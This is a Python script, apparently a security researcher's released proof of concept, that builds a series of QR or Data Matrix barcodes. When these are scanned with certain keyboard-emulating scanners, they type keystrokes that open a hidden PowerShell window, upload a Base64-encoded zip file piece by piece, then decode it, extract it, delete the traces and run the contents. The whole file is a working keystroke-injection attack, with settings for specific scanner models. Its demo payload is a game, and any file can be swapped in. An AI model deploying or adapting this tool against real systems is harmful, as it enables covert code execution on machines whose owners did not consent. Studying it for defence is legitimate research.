###################################################################
# The following Python script generates 2D barcodes that          #
# comprises a series of commands to perform the following         #
# actions:                                                        #
# The first barcode:                                              #
# 1. Open the Windows Start menu                                  #
# 2. Search and execute a PowerShell window.                      #
# 3. Minimize the size of the window                              #
# 4. Upload the first part of a file (Base64 encoded) to the host #
# Each following barcode:                                         #
# 5. Upload the following file part (Base64 encoded) to the host  #
# The last barcode:                                               #
# 6. Upload the last file part (Base64 encoded) to the host       #
# 7. Decode the uploaded file and delete it                       #
# 8. Unzip the decoded file and delete it                         #
# 9. Execute the unzipped files                                   #
#                                                                 #
# The script was created by Paz Hameiri in 2022 and released      #
# in 2023                                                         #
#                                                                 #
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL   #
# WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED   #
# WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL    #
# THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR      #
# CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM  #
# LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, #
# NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN       #
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.        #
###################################################################

# Tested on DELL P62F001 laptop Windows 10, Version 10.0.19043.1237
# Tested on Asus G731GU  laptop Windows 10, Version 10.0.19043.1237
# Tested on Asus G731GU  laptop Windows 11, Version 10.0.22000.282

# Tested with:
# * Honeywell Voyager 1400G
# * Datalogic QuickScan QW2420
# * Eyoyo EY-L5

import segno # Note: segno-pil also needs to be installed
from pylibdmtx.pylibdmtx import encode
from PIL import Image
from PIL import ImageFont
from PIL import ImageDraw
import matplotlib.pyplot as plt
import os
import base64

###################################################################
# Select barcode scanner                                          #
###################################################################

# Define barcode scanner model:
# Honeywell
# Datalogic
# Eyoyo
ControlCodes = "Honeywell"

# Select 2D barcode output:
# QRCode
# DataMatrix
SelectedBarcode = 'QRCode'

# Link between functions and ASCII codes (Barcode scanner dependent)
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    # Declare barcode scanner ASCII codes for Honeywell and Eyoyo:
    Alt         = chr(0x03)
    AltRelease  = chr(0x04)
    Ctrl        = chr(0x05)
    CtrlRelease = chr(0x06)
    Tab         = chr(0x09)
    Enter       = chr(0x0D)
    Ins         = chr(0x0E)
    Esc         = chr(0x0F)
    BackTab     = chr(0x14)
    AltBackTab  = Alt+BackTab+AltRelease
    
else:
    # Declare barcode scanner ASCII codes for Datalogic:
    Alt         = chr(0x9B)
    AltRelease  = chr(0x9C)
    Ctrl        = chr(0x9D)
    CtrlRelease = chr(0x9E)
    Tab         = chr(0x09)
    Enter       = chr(0x0D)
    Ins         = chr(0x83)
    Esc         = chr(0x1B)
    Shift       = chr(0x81)
    ShiftRelease = chr(0x82)
    AltBackTab  = Shift+Alt+Tab+ShiftRelease+AltRelease

###################################################################
# Define file name and barcode characters capacity limit          #
###################################################################

MyFile = 'Snake.zip' # Do not add a path to the file name - it is used at the target

                     # The zip file used in the tests contained the following files
                     # from https://github.com/kunalverma94/pokemon, coded by Kunal Verma:
                     # snake.html
                     # snake.min.css
                     # snake.min.js
                     
BarcodeTextLimit = 1100 # It is assumed that the number is bigger than the number of bytes
                        # required for the commands that come before the first part of the file

###################################################################
# Generate 2D barcodes that comprises a series of commands to     #
# perform the following actions:                                  #
# The first barcode:                                              #
# 1. Open the Windows Start menu                                  #
# 2. Search and execute a PowerShell window.                      #
# 3. Minimize the size of the window                              #
# 4. Upload the first part of a file (Base64 encoded) to the host #
# Each following barcode:                                         #
# 5. Upload the following file part (Base64 encoded) to the host  #
# The last barcode:                                               #
# 6. Upload the last file part (Base64 encoded) to the host       #
# 7. Decode the uploaded file and delete it                       #
# 8. Unzip the decoded file and delete it                         #
# 9. Execute the unzipped files                                   #
###################################################################

# View active applications. This action was added because sending Ctrl-Esc was not always working
TxString = (Ctrl+Alt+Tab+CtrlRelease+AltRelease+ 
            Ctrl+Alt+Tab+CtrlRelease+AltRelease)

# Add delay, waiting for the view to open
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (2 * 8)
else: TxString = TxString + Ins * (8 * 8)

# Open the Windows Start menu
TxString = (TxString +
            Ctrl+Esc+ # Press Ctrl-Esc to open the Windows Start menu
            CtrlRelease) # Release the Ctrl

# Add delay, waiting for the Start menu to open
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (2 * 8)
else: TxString = TxString + Ins * (10 * 8)

# Add search string for PowerShell
TxString = TxString + 'powersh' # Search string for PowerShell

# Add delay, waiting for the search to be performed
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (7 * 8)
else: TxString = TxString + Ins * (28 * 8)

# Add Enter to execute the command
TxString = (TxString + 
            Enter+ # Run PowerShell
            Ins+Ins+ # Delay, waiting for the command to be executed
            Esc) # Press Esc to exit the Windows Start menu (it otherwise stays open in some cases)

# Add delay, waiting for the PowerShell window to open
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (7 * 8)
else: TxString = TxString + Ins * (28 * 8)

# Add control operations to pass the control to the PowerShell window
TxString = (TxString + AltBackTab) # Press Alt-Back Tab to pass the control to the PowerShell window

# Add delay, waiting for the PowerShell to take control
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (3 * 8)
else: TxString = TxString + Ins * (12 * 8)

# Get file size
MyFileSize = os.path.getsize(MyFile)
# Load and convert values to text
with open(MyFile, "rb") as f:
    FileTextArray = (base64.b64encode(f.read(MyFileSize))).decode('ascii')

# Add commands and control operations to minimize the powershell window and output the first part of the file
TextArray = (TxString +
            'function prompt {""}'+Enter+ # Echo off
            'mode con:cols=100lines=1'+Enter+ # Minimize the PowerShell window
            '$inpstr="'+ # Output the content
            FileTextArray)

# Define $inpstr= commands headers and footers
FirstFooter = '"'+Enter
FollowingFooters = '"'+Enter
FollowingHeaders = '$inpstr=$inpstr+"'

# Define the commands to be executed after the file dump
FinalString = ('$bytes=[System.Convert]::FromBase64String($inpstr)'+Enter+ # Base64 decode
               "[IO.File]::WriteAllBytes('"+MyFile+"',$bytes)"+Enter+ # Save the recovered file
               'Expand-Archive '+MyFile+' -DestinationPath .\ -force'+Enter+ # Extract the files
               'del '+MyFile+Enter+ # Delete the uploaded file
               'rundll32 url.dll,FileProtocolHandler Snake.html'+Enter+ # Activate Snake.html
               'exit'+Enter # Exit the PowerShell window
               )

# Generate 2D barcodes
Iteration = 1
LastIteration = 2
TextArrayIndex = 0
TextArrayNextIndex = BarcodeTextLimit-len(FirstFooter)
TxString = (TextArray[0:TextArrayNextIndex]+FirstFooter)
while Iteration < LastIteration:
    # Check if TxString is empty. TxString may not be empty in one of two cases:
    # a. At the first iteration
    # b. When the last 2D barcode created holds the information of the FinalString alone
    # If TxString is empty, then build it using the data stored in TextArray
    if TxString == "" :
        TextArrayNextIndex = TextArrayIndex+BarcodeTextLimit-len(FollowingFooters)-len(FollowingHeaders)
        TxString = (FollowingHeaders+
                    TextArray[TextArrayIndex:TextArrayNextIndex]+
                    FollowingFooters)
    
    # Set OutputString to the value of TxString
    OutputString = TxString
    
    # Set the value of TextArrayIndex to the next step
    # If its value is less than the length of TextArray, then prepare for another iteration
    TextArrayIndex = TextArrayNextIndex
    if TextArrayIndex < len(TextArray):
        LastIteration = LastIteration + 1
        TxString = ""
    # If the value of TextArrayIndex is not less than the length of TextArray it means that
    # There's a potential that this could be the last 2D barcode generated.
    # If a single 2D barcode, that conation both data and FinalString may be generated, then it is being generated
    # Otherwise, a single 2D barcode is generated and preparations are made for a final iteration
    else:
        if len(OutputString) + len(FinalString) <= BarcodeTextLimit:
            if TxString == " ": OutputString = FinalString
            else: OutputString = OutputString + FinalString
        else:
            TxString = " "
            LastIteration = LastIteration + 1
    
    ###################################################################
    # Generate the 2D barcode                                         #
    ###################################################################
        
    # Generate QR Code or Data Matrix barcode
    if SelectedBarcode.upper() == "QRCODE":
        # Generate QR code
        qr = segno.make(OutputString, mode='byte', encoding='ISO 8859-1') # Image creation with segno, encoding ISO 8859-1 for ASCII codes 128-255
        img = qr.to_pil(scale = 10)
        
        # Set image font
        font = ImageFont.truetype("arial.ttf", 28, encoding="unic")
    else:
        # Generate Data Matrix
        encoded_data = encode(OutputString.encode('ISO 8859-1'), scheme='Base256') # schemes: 'Ascii', 'AutoBest', 'AutoFast', 'Base256', 'C40', 'Edifact', 'Text', 'X12'
        img = Image.frombytes('RGB', (encoded_data.width, encoded_data.height), encoded_data.pixels)
        
        # Set image font
        font = ImageFont.truetype("arial.ttf", 16, encoding="unic")
    
    # Change the image canvas size to add text above the image
    widthOffset = 100
    heightOffset = 30
    imgwidth, imgheight = img.size
    imgWithText = Image.new(img.mode, (imgwidth + widthOffset, imgheight + heightOffset), 'white')
    imgWithText.paste(img, (0, heightOffset))
    img = imgWithText
    
    # Add Text to the image
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), ControlCodes + ':' + 'Upload and run file - Base64 encoding with PS ' + str(Iteration),fill = 'black', font = font)
    
    # Display the barcode in Spyder
    plt.imshow(img)
    
    # Display the barcode in Windows
    img.show()

    # Advance the iteration number    
    Iteration = Iteration + 1
    
    # Print the value of TextArrayIndex
    print(TextArrayIndex)
